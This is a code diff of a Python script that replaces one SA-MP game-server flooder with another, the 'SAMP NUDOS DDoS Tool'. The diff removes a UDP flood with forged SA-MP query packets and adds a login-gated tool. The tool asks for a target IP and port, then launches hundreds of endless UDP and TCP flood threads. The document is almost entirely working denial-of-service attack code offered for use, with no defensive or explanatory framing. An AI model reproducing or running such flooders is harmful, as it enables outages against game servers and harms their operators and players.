@@ -1,92 +1,106 @@
-# dsamp.py - SA-MP UDP Flooder (High Packet Rate)
-# Usage: python dsamp.py
-# Input: IP → Port → Duration (seconds)
-
+import random
 import socket
 import threading
 import time
-import random
-import sys
 import os
+import sys
 
-# Warna terminal (opsional, biar keliatan lebih kece)
-os.system('')  # Windows ANSI support
-GREEN = '\033[92m'
-RED   = '\033[91m'
-RESET = '\033[0m'
+os.system("clear")
 
-def udp_flood(ip, port, duration, thread_id):
-    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    bytes_to_send = random._urandom(1024)  # paket acak 1KB
+print("\033[35m")
+print("""
+	  AUTHOR TOOLS : SAMP NUDOS
+	╔═╗╔═╗╔╦╗╔═╗   ╔╗╔╦ ╦╔╦╗╔═╗╔═╗
+	╚═╗╠═╣║║║╠═╝───║║║║ ║ ║║║ ║╚═╗
+	╚═╝╩ ╩╩ ╩╩     ╝╚╝╚═╝═╩╝╚═╝╚═╝ V 1.6 FIXED
+""")
+print("\033[0m")
 
-    # Beberapa payload SA-MP query palsu (lebih efektif crash query handler)
-    samp_queries = [
-        b'SAMP' + bytes([random.randint(0,255) for _ in range(10)]),  # fake query
-        b'i' + b'\x00'*10,                                             # info query
-        b'r' + b'\x00'*10,                                             # rules
-        b'c' + b'\x00'*10,                                             # clients
-        b'd' + b'\x00'*10,                                             # detailed players
-        b'p' + b'\x00'*10                                              # ping
-    ]
+# Login sederhana
+attemps = 0
+while attemps < 3:
+    username = input('Enter your username: ')
+    password = input('Enter your password: ')
+    if username == 'NUDOS' and password == 'NUDOS':
+        print('\033[32mYou have successfully logged in. Welcome to NUDOS!!\033[0m')
+        break
+    else:
+        print('\033[31mIncorrect credentials.\033[0m')
+        attemps += 1
+else:
+    print("Too many failed attempts. Exiting.")
+    sys.exit()
 
-    end_time = time.time() + duration
+os.system("clear")
 
-    sent = 0
-    while time.time() < end_time:
+print("\033[35mSAMP NUDOS DDoS Tool - FIXED & UPGRADED 2026\033[0m\n")
+
+ip = input("Target IP      : ")
+port = int(input("Target Port    : ") or 7777)
+choice = input("Use Full Attack (y/n): ").lower()
+times = int(input("Packets per thread : ") or 100)
+threads = int(input("Number of Threads  : ") or 200)
+
+print(f"\n\033[31mATTACKING {ip}:{port} with {threads} threads...\033[0m")
+print("Press Ctrl+C to stop.\n")
+
+def udp_flood():
+    data = random._urandom(random.randint(512, 2048))
+    while True:
         try:
-            # Kirim payload acak + kadang query SA-MP
-            if random.random() > 0.7:
-                payload = random.choice(samp_queries)
-            else:
-                payload = bytes_to_send
-
-            sock.sendto(payload, (ip, port))
-            sent += 1
-
-            if sent % 500 == 0:
-                print(f"{GREEN}[Thread {thread_id}]{RESET} Sent {sent:,} packets", end='\r')
-
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.sendto(data, (ip, port))
+            print("\033[32m[UDP] Packet Sent!\033[0m", end="\r")
         except:
-            pass  # ignore error socket
+            pass
+        time.sleep(0.001)
 
-    print(f"{GREEN}[Thread {thread_id}]{RESET} Finished - {sent:,} packets sent")
+def tcp_flood():
+    data = random._urandom(random.randint(512, 1024))
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1)
+            s.connect((ip, port))
+            for _ in range(times):
+                s.send(data)
+            print("\033[33m[TCP] Connection Flood Sent!\033[0m", end="\r")
+            s.close()
+        except:
+            pass
+        time.sleep(0.01)
 
-def main():
-    print(f"{RED}DSAMP FLOODER - SA-MP UDP Attack{RESET}")
-    print("------------------------------------")
+def run():
+    while True:
+        try:
+            if random.choice([True, False]):
+                udp_flood()
+            else:
+                tcp_flood()
+        except:
+            pass
 
-    target_ip   = input(f"{GREEN}Target IP: {RESET}")
-    try:
-        target_port = int(input(f"{GREEN}Port (default 7777): {RESET}") or 7777)
-    except:
-        target_port = 7777
+# Mulai attack
+try:
+    for _ in range(threads):
+        if choice == 'y':
+            # Full attack: UDP + TCP
+            t1 = threading.Thread(target=udp_flood, daemon=True)
+            t2 = threading.Thread(target=tcp_flood, daemon=True)
+            t1.start()
+            t2.start()
+        else:
+            # UDP only (lebih ringan)
+            t = threading.Thread(target=udp_flood, daemon=True)
+            t.start()
+        
+        time.sleep(0.005)  # stagger threads
 
-    try:
-        duration = int(input(f"{GREEN}Duration (seconds): {RESET}"))
-    except:
-        duration = 60
-        print(f"Default duration set to {duration} seconds")
+    print("\033[31mAttack is running... Press Ctrl+C to stop.\033[0m")
+    while True:
+        time.sleep(10)
 
-    thread_count = 300  # ubah sesuai kemampuan PC (100-1000)
-
-    print(f"\n{RED}Starting attack on {target_ip}:{target_port} for {duration}s with {thread_count} threads...{RESET}")
-    print("Press Ctrl+C to stop manually\n")
-
-    threads = []
-
-    for i in range(thread_count):
-        t = threading.Thread(target=udp_flood, args=(target_ip, target_port, duration, i+1))
-        t.daemon = True
-        t.start()
-        threads.append(t)
-
-    try:
-        time.sleep(duration + 2)
-    except KeyboardInterrupt:
-        print(f"\n{RED}Attack stopped by user{RESET}")
-        sys.exit(0)
-
-    print(f"\n{GREEN}Attack selesai.{RESET}")
-
-if __name__ == "__main__":
-    main()
+except KeyboardInterrupt:
+    print("\n\n\033[31mAttack stopped by user.\033[0m")
+except Exception as e:
+    print(f"\nError: {e}")
